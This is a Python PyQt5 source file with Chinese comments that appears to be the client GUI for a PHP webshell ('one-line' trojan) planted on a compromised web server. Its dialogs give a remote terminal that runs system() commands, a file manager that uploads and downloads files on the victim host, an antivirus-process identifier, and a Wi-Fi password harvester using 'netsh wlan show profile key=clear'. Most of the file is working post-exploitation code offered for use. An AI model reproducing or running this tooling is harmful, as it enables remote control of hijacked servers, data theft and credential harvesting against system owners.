import base64
import json
import os
import sys
import pyttsx3
import requests
from PyQt5.QtWidgets import QVBoxLayout, QDialog, QPushButton, QLabel, QLineEdit, QMessageBox, QTextEdit, QHBoxLayout, \
    QTableWidget, QAbstractItemView, QTableWidgetItem, QHeaderView, QComboBox, QTreeWidget, QTreeWidgetItem, \
    QListWidget, QListWidgetItem, QFileDialog
from PyQt5.QtCore import Qt, QSize, QDir
from myfuntions import cmd_conn
#这个是光标库
from PyQt5.QtGui import QTextCursor, QIcon

BASE_DIR = os.path.dirname(os.path.realpath(sys.argv[0]))

#杀软识别
class AlertDialog(QDialog):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        #页面的初始化
        self.init_ui()
        self.list_exe, self.list_value = self.read_av()

    def init_ui(self):
        self.setWindowTitle("杀软识别")
        self.resize(538, 484)

        layout = QVBoxLayout()

        #添加个列表
        self.table2_widget = table2_widget = QTableWidget(0,2)
        table2_widget.setAlternatingRowColors(True)
        # 设置表格为整行选择
        table2_widget.setSelectionBehavior(QAbstractItemView.SelectRows)
        # 表格添加到布局中
        table_header = [
            {"text": "进程名称"},
            {"text": "杀软名称"}
        ]
        for idx, info in enumerate(table_header):
            item = QTableWidgetItem()
            item.setText(info['text'])
            # 文本居中显示
            item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
            table2_widget.setHorizontalHeaderItem(idx, item)

            #设置表格头的伸缩模式，也就是让表格铺满整个QTableWidget控件。
            self.table2_widget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)

        layout.addWidget(table2_widget)

        from_data_list = [
            {"title": "手动识别"}
        ]

        for item in from_data_list:
            lbl = QLabel()
            lbl.setText(item['title'])
            layout.addWidget(lbl)
            self.txt =txt = QTextEdit()
            txt.setFixedHeight(200)
            layout.addWidget(txt)

        btn_check = QPushButton("检测")
        btn_check.clicked.connect(self.event_check_click)
        layout.addWidget(btn_check, 0, Qt.AlignRight)

        layout.addStretch(1)
        self.setLayout(layout)

#读取杀软的JSON文件,获取到对应的进程名字和软件名字,可以考虑把这一步加在一开始弹窗的时候,不过先不改了
    def read_av(self):
        #读取杀软的JSON文件
        file_path = os.path.join(BASE_DIR, "db", "av.json")
        with open(file_path, "r", encoding="utf-8") as f:
            data = f.read()
        av_list = json.loads(data)
        # 然后进程和软件名对应起来,分别放到两个列表中
        list_exe = []
        list_value = []
        for sett in av_list:
            for key, value in sett.items():
                if key.endswith(".exe"):
                    list_exe.append(key)
                    list_value.append(value)
                else:
                    list_exe.append(value)
                    list_value.append(key)
        return list_exe, list_value

    def event_check_click(self):
        try:
            #拿到杀软的进程名和软件名
            self.list_exe, self.list_value = self.read_av()
            #然后获取输入的文本
            task_str = self.txt.toPlainText()
            # 不知道啥格式,先转成字符串再说
            task_str = str(task_str)

            if task_str.strip():
                # 每次点击都要先把表格初始化,防止重复添加,就采用删除行的方式吧
                # 设置行数为0即可
                self.table2_widget.setRowCount(0)
                self.check_func(task_str)
        except Exception as e:
            print(e)

    #判断单独拿出来
    def check_func(self, task_str):
        test_list = task_str.strip().split("\n")
        result_list = []
        for x in test_list:
            if ".exe" in x:
                x_list = x.strip().split(" ")
                for i in x_list:
                    if i.endswith(".exe"):
                        result_list.append(i)
        # 下面就开始判断是否存在了
        for index, value in enumerate(self.list_exe):
            if value in result_list:
                # 如果存在的话就把结果放到列表中,先把两个值拿到
                av_task = value
                av_name = self.list_value[index].split('\n')[0]
                self.add_str(av_task, av_name)

    def add_str(self, exe, name):
        new_row_list = [exe, name]
        # 准备往表格里添加数据,先获取当前行数
        current_row_count = self.table2_widget.rowCount()  # 获取当前表格有多少行
        # 插入一行
        self.table2_widget.insertRow(current_row_count)
        for i, ele in enumerate(new_row_list):
            cell = QTableWidgetItem(str(ele))
            # 文本居中显示
            cell.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
            # 设置除了备注栏之外其余的都不可修改, 备注索引是5
            # if i != 5:
            #     cell.setFlags(Qt.ItemIsSelectable | Qt.ItemIsEnabled)
            if i != 1:
                cell.setFlags(Qt.ItemIsSelectable | Qt.ItemIsEnabled)
            self.table2_widget.setItem(current_row_count, i, cell)

#虚拟终端
class AlertDialogCmd(QDialog):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        #页面的初始化
        self.init_ui()

    def url_pwd(self, url, pwd):
        self.url = url
        self.pwd = pwd
        # 获取当前一句话所在的绝对路径(不包含文件名),拿到之后要进行处理,以便可以执行cd .. 命令
        self.torjan_file_path = cmd_conn(self.url, self.pwd, "echo dirname(__FILE__);")
        # print(self.torjan_file_path)

    def init_ui(self):
        self.setWindowTitle("虚拟终端")
        self.resize(1000, 484)
        layout = QVBoxLayout()
        #将最上面的那个布局添加过来
        layout.addLayout(self.commonly_used())
        layout.addLayout(self.init_header())

        from_data_list = [
            {"title": "七七世界第一可爱"}
        ]
        for item in from_data_list:
            lbl = QLabel()
            lbl.setText(item['title'])
            layout.addWidget(lbl)
            self.txt = txt = QTextEdit()
            self.txt.insertPlainText("七七超级可爱:>")

            layout.addWidget(txt)
            # 设置按下回车就触发方法,采用的是检查更改的内容的改变是否以回车结尾,这里先绑定事件,然后在下面创建方法
            #不过会出现个问题,就是文本删除的时候,如果有回车键同样是会触发这个方法的,所以要设定当前文本不可删除
            self.txt.textChanged.connect(self.text_change)
            #获取当前文本
            self.current_msg = self.txt.toPlainText()
            # 设置布局伸缩量
            # layout.addStretch(1)

            self.setLayout(layout)

# 终端界面
    def init_header(self):
        header_layout = QHBoxLayout()
        # 添加cmd输入框
        cmd_text = QLineEdit()
        # 先获取输入框的内容
        cmd_text.text()
        # 输入框添加默认文字
        # url_text.setPlaceholderText("whoami")
        # 将url_text的值赋值给self.url_text,方便其他函数内使用
        self.cmd_text = cmd_text

        header_layout.addWidget(cmd_text)

        # 添加按钮
        bt_add = QPushButton("添加常用")
        # 绑定事件
        bt_add.clicked.connect(self.event_add_click)
        header_layout.addWidget(bt_add)

        return header_layout
#常用展示
    def commonly_used(self):
        #添加标签、下拉框、删除按钮
        com_layout = QHBoxLayout()
        # 添加Label
        self.label_status = label_status = QLabel("常用命令: ", self)
        com_layout.addWidget(label_status)

        # 读取配置文件,添加下拉框
        from myfuntions import read_json
        cb_list = read_json("./db/terminal.json")
        self.cb = cb = QComboBox(self)
        # 设置宽度
        cb.setFixedWidth(700)
        cb.setFixedHeight(28)
        # 添加多个条目
        cb.addItems(cb_list)

        com_layout.addWidget(cb)
        # com_layout.addStretch()
        bt_run = QPushButton("执行")
        bt_run.clicked.connect(self.event_run_click)
        com_layout.addWidget(bt_run)
        bt_del = QPushButton("删除")
        bt_del.clicked.connect(self.event_del_click)
        com_layout.addWidget(bt_del)

        return com_layout

#执行按钮功能
    def event_run_click(self):
        # 获取当前下拉框的选项
        current_cmd = self.cb.currentText().strip()
        #将光标移动到文本框最后
        self.txt.moveCursor(QTextCursor.End)
        #添加到下面那个文本框中,并在末尾加个回车
        current_cmd += "\n"
        self.txt.insertPlainText(current_cmd)

#删除按钮功能
    def event_del_click(self):
        #获取当前选中的索引,然后删除
        index = self.cb.currentIndex()
        self.cb.removeItem(index)
        #删除之后也要保存设置
        self.save_conf()

#添加按钮功能
    def event_add_click(self):
        #获取当前文本框中的内容,然后进行添加
        current_text = self.cmd_text.text().strip()
        #非空判断
        if current_text != "":
            self.cb.addItem(current_text)
            self.cmd_text.clear()
        #添加完之后就保存设置
        self.save_conf()

#保存下拉框配置
    def save_conf(self):
        from myfuntions import save_json
        #不管是删除还是添加,最后都要执行保存配置
        #创建个列表来收集内容
        txt_list = []
        #先获取下拉框的所有选项个数
        all_index = self.cb.count()
        for index in range(all_index):
            txt_list.append(self.cb.itemText(index))
        save_json("./db/terminal.json", txt_list)

#内容改变触发的方法
    def text_change(self):

        # 获取当前一句话所在的绝对路径(不包含文件名),拿到之后要进行处理,以便可以执行cd .. 命令
        # self.torjan_file_path = cmd_conn(self.url, self.pwd, "echo dirname(__FILE__);").strip()
        # 先把初始内容添加上,就写一句话的绝对路径,这样一来也可以把空字符串判断改变的问题解决
        # self.txt.insertPlainText("七七超级可爱")
        #将光标移动到最后
        # 将光标移动到文本框最后
        self.txt.moveCursor(QTextCursor.End)
        #先拿到文本框内容
        self.second_msg= msg = self.txt.toPlainText()
        #判断最后是否按下了回车键,如果按下就执行发送数据的方法
        if msg.strip() != "" and msg.endswith("\n"):
            self.send_cmd()

#发送命令,并添加到文本框内
    def send_cmd(self):
        try:
            #网上没找到啥好的解决方法,只能自己找不同了,采用了切片的方式
            self.change_msg = self.second_msg[len(self.current_msg):-1].strip()
            # print(self.change_msg)
            res_text = cmd_conn(self.url, self.pwd, f"system('{self.change_msg}');")

            res_text = f"""{res_text.strip()}

{self.torjan_file_path.strip()}:>"""

            self.txt.insertPlainText(res_text)

            #最后将当前文字状态保存下
            self.current_msg = self.txt.toPlainText().strip()
        except Exception as e:
            print(e)

#代理功能
class ProxyDialog(QDialog):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        # 页面的初始化
        self.init_ui()

    def init_ui(self):
        #构思:页面分为三块,然后分别设置对应的样式,然后再添加到里面
        self.setWindowTitle("代理设置")
        self.resize(600, 320)
        layout = QVBoxLayout()
        # 将其他布局添加过来
        # 添加个弹簧
        layout.addStretch()
        layout.addLayout(self.init_select())
        layout.addLayout(self.init_ip())
        layout.addLayout(self.init_port())
        layout.addLayout(self.init_save())
        layout.addStretch()

# 读取保存的配置文件,然后设定当前内容
        from myfuntions import read_json
        self.conf_file_path = os.path.join(BASE_DIR, "db", "proxy.json")
        proxy_conf = read_json(self.conf_file_path)

        # 此时拿到配置列表了,
        proxy_size = proxy_conf[0]
        proxy_ip = proxy_conf[1]
        proxy_port = proxy_conf[2]

        # 设置配置保存的代理类型
        for index, size in enumerate(self.proxy_size_list):
            if size == proxy_size:
                self.cb.setCurrentIndex(index)

        # 设置代理主机显示内容
        self.url_text.setText(proxy_ip)
        #设置代理ip显示内容
        self.port_text.setText(proxy_port)

        # 给窗体设置元素的排列方式
        self.setLayout(layout)
        self.setLayout(layout)

#下拉框
    def init_select(self):
        select_layout = QHBoxLayout()
        select_layout.addStretch()
        # 添加Label
        self.label_status = label_status = QLabel("代理类型:         ", self)
        select_layout.addWidget(label_status)
        #添加下拉框
        self.cb = cb = QComboBox(self)
        # self.cb.move(200,100)
        self.proxy_size_list = proxy_size_list = ['不使用代理', 'HTTP代理', 'HTTPS代理', 'SOCKS5代理']
        #添加多个条目
        cb.addItems(proxy_size_list)

        #信号
        # self.cb.currentIndexChanged[str].connect(self.print_value) #条目发生改变,发射信号,传递条目内容
        # self.cb.currentIndexChanged[int].connect(self.print_value)#条目发生改变,发射信号,传递条目内容
        # self.cb.highlighted[str].connect(self.print_value)# 在下拉列表中，鼠标移动到某个条目时发出信号，传递条目内容
        # self.cb.highlighted[int].connect(self.print_value) # 在下拉列表中，鼠标移动到某个条目时发出信号，传递条目索引
        select_layout.addWidget(cb)
        select_layout.addStretch()
        return select_layout

#ip框
    def init_ip(self):
        ip_layout = QHBoxLayout()
        # 在右侧添加个弹簧,把两个按钮弹到左边
        ip_layout.addStretch()
        #添加个label
        # 添加Label
        self.label_status = label_status = QLabel("代理主机: ", self)
        ip_layout.addWidget(label_status)
        # 添加url输入框
        url_text = QLineEdit()
        # 先获取输入框的内容
        url_text.text()
        # 输入框添加默认文字
        url_text.setPlaceholderText("例如:127.0.0.1")
        # 将url_text的值赋值给self.url_text,方便其他函数内使用
        self.url_text = url_text
        ip_layout.addWidget(url_text)

        ip_layout.addStretch()
        return ip_layout

#port框
    def init_port(self):
        port_layout = QHBoxLayout()
        port_layout.addStretch()
        # 添加个label
        # 添加Label
        self.label_status = label_status = QLabel("代理端口: ", self)
        port_layout.addWidget(label_status)
        # 添加url输入框
        self.port_text = port_text = QLineEdit()
        # 先获取输入框的内容
        port_text.text()
        # 输入框添加默认文字
        port_text.setPlaceholderText("例如:7432")
        # 将url_text的值赋值给self.url_text,方便其他函数内使用
        port_layout.addWidget(port_text)

        port_layout.addStretch()
        return port_layout

#保存按钮
    def init_save(self):
        save_layout = QHBoxLayout()
        # 在左侧添加个弹簧
        save_layout.addStretch()
        #创建一个按钮,加入到横向区域
        bt_save = QPushButton("保存设置")
        bt_save.setFixedWidth(260)
        #添加按钮点击事件
        # 绑定事件
        bt_save.clicked.connect(self.event_save_click)

        save_layout.addWidget(bt_save)
        #在右侧添加个弹簧
        save_layout.addStretch()
        return save_layout

#点击保存
    def event_save_click(self):
        #获取当前下拉框中的内容
        current_size = self.cb.currentText()
        #获取当前代理主机
        current_ip = self.url_text.text().strip()
        #获取当前代理Ip
        current_port = self.port_text.text().strip()
        proxy_conf_list = []
        proxy_conf_list.append(current_size)
        proxy_conf_list.append(current_ip)
        proxy_conf_list.append(current_port)
        #这样就弄下配置列表了
        #点击保存
        from myfuntions import save_json
        save_json(self.conf_file_path, proxy_conf_list)
        self.messageDialog()

#弹窗功能
    def messageDialog(self):
        try:
            msg_box = QMessageBox(QMessageBox.Information, "小僵尸", "保存成功,重启生效")
            msg_box.exec_()
        except Exception as e:
            print(e)

#目录管理
class FileMag(QDialog):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def url_pwd(self, url, pwd):
        self.url = url
        self.pwd = pwd
        # 获取当前一句话所在的绝对路径(不包含文件名)
        self.torjan_file_path = cmd_conn(self.url, self.pwd, "echo dirname(__FILE__);")
        self.all_path_list = self.torjan_file_path.strip().split("\\")
        self.root_list = ["C:"]
        if self.all_path_list[0] != "C:":
            self.root_list.append(self.all_path_list[0])
        # print(self.all_path_list)  # 拿到列表了,遍历创建字列表
        # 页面的初始化
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("文件管理")
        self.resize(1000, 484)
        layout = QHBoxLayout()
        #将最上面的那个布局添加过来
        layout.addLayout(self.left_ui())
        layout.addLayout(self.right_ui())
        self.setLayout(layout)

# 左侧界面,后面要把添加节点功能单独拿出来定义个方法
    def left_ui(self):
        try:
            header_layout = QHBoxLayout()
            #创建个树控件
            self.tree = QTreeWidget()
            self.tree.setFixedWidth(300)
            #指定列
            self.tree.setColumnCount(1)
            #指定列的标签
            self.tree.setHeaderLabel('目录列表')
            for root_path in self.root_list:
                self.root = QTreeWidgetItem(self.tree)
                # 设置根节点
                self.root.setText(0, root_path)
                # 设置根节点的宽
                self.root.setIcon(0, QIcon('./image/1.ico'))
                # 设置列宽
                self.tree.setColumnWidth(0, 250)
                self.index = 1
                if root_path in self.all_path_list:
                    self.add_root(self.root)
           #设置展开
            self.tree.expandAll()
            header_layout.addWidget(self.tree)
            #添加单机触发事件
            self.tree.clicked.connect(self.event_click)


            return header_layout
        except Exception as e:
            print(e)

#初始化节点功能
    def add_root(self, root):
        if self.index < len(self.all_path_list):
            item = QTreeWidgetItem(root)
            item.setText(0, self.all_path_list[self.index])
            item.setIcon(0, QIcon('./image/1.ico'))
            root.addChild(item)
            self.index += 1
            self.add_root(item)

#目录树点击节点触发的功能,这个要实现获得当前路径并合成总路径,发起遍历请求,查看当前数据,并更新数据
    def event_click(self, index):
        #获得当前选中项
        self.item = item = self.tree.currentItem()
        self.current_path = item.text(0)
        #当前索引项,好像是叫这个
        # print(index.row())
        #获得当前节点的值
        # print(item.text(0))
        #获取父项的值
        # print(item.parent().text(0))
        #获取子项的值
        # print(item.child(0).text(0))
        # father = item.parent()

        #获取物理路径
        self.get_path(self.item)
        # print(self.current_path)

        #获取到路径之后就开始发请求包,然后更新数据,单独拿出来弄到一个方法里了
        self.updata()

#更新数据单独拿出来
    def updata(self):
        # 获取到路径之后就开始发请求包,然后更新数据
        from myfuntions import cmd_conn
        payload = """$dir = "c:/";
        if (is_dir($dir)) {
           if ($dh = opendir($dir)) {
              while (($file = readdir($dh)) !== false) {
                   echo $file . "\n";
               }
               closedir($dh);
           }
        }
                    """.replace("c:/", self.current_path)
        # 获取到当前目录下的所有文件名,但是需要处理,因为有. 和.. 算文件名了
        res = cmd_conn(self.url, self.pwd, payload)
        res = res.split()
        try:
            res.remove(".")
            res.remove("..")
        except:
            pass
        num = self.tree.currentItem().childCount()
        child_list = []
        for i in range(num):
            child_list.append(self.tree.currentItem().child(i).text(0))
        # 此时已经处理好所有的文件名了,然后开始添加数据,需要先获取当前选中的节点的子节点,遍历内容,添加没的
        for child_path in res:
            if child_path not in child_list:
                item = QTreeWidgetItem(self.tree.currentItem())
                item.setText(0, child_path)
                item.setIcon(0, QIcon('./image/1.ico'))
                self.tree.currentItem().addChild(item)
        # 添加完之后要设置自动展开
        self.tree.expandItem(self.tree.currentItem())

        # 这下就该往右侧列表添加数据了,首先依旧是遍历右侧列表内的所有内容,算了,直接删除把
        self.dir_list.clear()
        for each in res:
            # self.dir_list.addItem(each)
            # 创建Qlistwidgetitem对象
            list_item = QListWidgetItem()
            list_item.setSizeHint(QSize(100, 30))
            list_item.setIcon(QIcon('./image/1.ico'))
            list_item.setText(each)
            self.dir_list.addItem(list_item)

    def get_path(self, item):
        #使用递归判断父项,如果是根节点,父项为None,将值拼接凑成完整路径
        try:
            if item.parent() != None:
                self.current_path = item.parent().text(0) + "\\" + self.current_path
                self.get_path(item.parent())
            else:
                pass
        except Exception as e:
            print(e)

#右侧展示
    def right_ui(self):
        #添加标签、下拉框、删除按钮
        com_layout = QVBoxLayout()
        com_layout.addLayout(self.right1())
        #上面的按钮布局添加好之后,在下面添加个列表
        #实例化列表控件
        self.dir_list = dir_list = QListWidget()

        com_layout.addWidget(dir_list)
        return com_layout

#右侧上
    def right1(self):
        com_layout = QHBoxLayout()
        btn_upload = QPushButton("上传")
        btn_upload.clicked.connect(self.event_upload_click)
        com_layout.addWidget(btn_upload)

        btn_download = QPushButton("下载")
        btn_download.clicked.connect(self.event_download_click)
        com_layout.addWidget(btn_download)
        com_layout.addStretch()

        return com_layout

#上传文件功能
    def event_upload_click(self):
        #先判断当前有没有选中目录
        if self.tree.selectedItems():
            #先选择文件
            filename = self.upload_choose()
            # 没有选择会返回False
            if filename == "False":
                pass
            else:
                # 然后开始调用上传的方法了,为了方便调试,把方法写到这个文件下面了
                from myfuntions import upload_conn, upload_openfile
                filedata = upload_openfile(filename)
                filedata = base64.b64encode(filedata)  # 由于是打开字节文件,此处做编码处理
                filename = filename.split("/")[-1]
                #拼接下路径
                filename = self.current_path + "/" + filename
                upload_conn(self.url, self.pwd, filename, filedata)
                pyttsx3.speak("完事,不知道成功了没有")
        else:
            # print("未选中")
            pass

#选择文件
    def upload_choose(self):
        try:
            #第一步当然是选择文件了

            file_path, file_type = QFileDialog.getOpenFileName(self, '选择文件', '',
                                                               'All Files(*.*)')
            if file_path == '':
                return "False" # 防止关闭或取消导入关闭所有页面
            else:
                return file_path
        except Exception as e:
            print(e)

#上传下载文件功能
    def event_download_click(self):
        #选中目录不用判断,因为只要选择列表中的文件,肯定有目录
        if self.dir_list.selectedItems():
            self.current_file = self.dir_list.selectedItems()
            download_file = self.current_path + "\\" + self.current_file[0].text()
            # print(download_file) #D:\phpstudy\phpstudy_pro\WWW\123.jpg
            #下面开始选择文件夹
            folder_path = self.download_choose()
            if folder_path == "":
                pass
            else:
                #此时已经选择好要下载的文件和要保存的文件夹了
                # print(folder_path)
                #拼接文件名和文件夹
                mine_path = folder_path + "/" + self.current_file[0].text()
                # print(mine_path)#D:/信息安全录像/12.python/视频文件/笔记/pyqt/杀软/123.jpg
                #然后就开始发送数据,请求下载文件的内容,并返回到浏览器
                from myfuntions import download_conn, download_openfile
                download_data = download_conn(self.url, self.pwd, download_file)
                if download_data == "False":
                    pyttsx3.speak("下载失败")
                else:
                    download_openfile(mine_path, download_data)
                    pyttsx3.speak("完事,不知道成功了没有")
#下载选择文件夹
    def download_choose(self):
        folder_path = QFileDialog.getExistingDirectory(self, "选择文件夹")
        return folder_path

#WIFI密码
class WifiDialog(QDialog):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def get_url(self, url, pwd):
        self.url = url
        self.pwd = pwd
        # 页面的初始化
        self.init_ui()


    def init_ui(self):
        self.setWindowTitle("WIFI密码收集")
        self.resize(538, 484)
        layout = QVBoxLayout()

        #添加个列表
        self.table2_widget = table2_widget = QTableWidget(0,2)
        table2_widget.setAlternatingRowColors(True)
        # 设置表格为整行选择
        table2_widget.setSelectionBehavior(QAbstractItemView.SelectRows)
        # 表格添加到布局中
        table_header = [
            {"text": "WIFI名称"},
            {"text": "密码"}
        ]
        for idx, info in enumerate(table_header):
            item = QTableWidgetItem()
            item.setText(info['text'])
            # 文本居中显示
            item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
            table2_widget.setHorizontalHeaderItem(idx, item)

            #设置表格头的伸缩模式，也就是让表格铺满整个QTableWidget控件。
            self.table2_widget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        layout.addWidget(table2_widget)
        self.setLayout(layout)
        self.wifi_get()

    def wifi_get(self):
        from myfuntions import cmd_conn
        payload = "system('netsh wlan show profiles');"
        wifi_res = cmd_conn(self.url, self.pwd, payload)
        #获取到所有wifi名称
        wifi_res_list = wifi_res.split("所有用户配置文件")[1:-1]
        for i in wifi_res_list:
            i = i.strip().split(":")[-1].strip()
            payload2 = "system('" + "netsh wlan show profile"+f' name="{i}" ' + "key=clear'" + ');'
            # print(payload2)
            wifi_pwd_str = cmd_conn(self.url, self.pwd, payload2)
            wifi_pwd_list = wifi_pwd_str.split("关键内容")[-1].split("费用设置")[0].split(":")[-1].strip()
            self.add_str(i, wifi_pwd_list)

    def add_str(self, wifi_name, wifi_pwd):
        new_row_list = [wifi_name, wifi_pwd]
        # 准备往表格里添加数据,先获取当前行数
        current_row_count = self.table2_widget.rowCount()  # 获取当前表格有多少行
        # 插入一行
        self.table2_widget.insertRow(current_row_count)
        for i, ele in enumerate(new_row_list):
            cell = QTableWidgetItem(str(ele))
            # 文本居中显示
            cell.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
            if i != 1:
                cell.setFlags(Qt.ItemIsSelectable | Qt.ItemIsEnabled)
            self.table2_widget.setItem(current_row_count, i, cell)

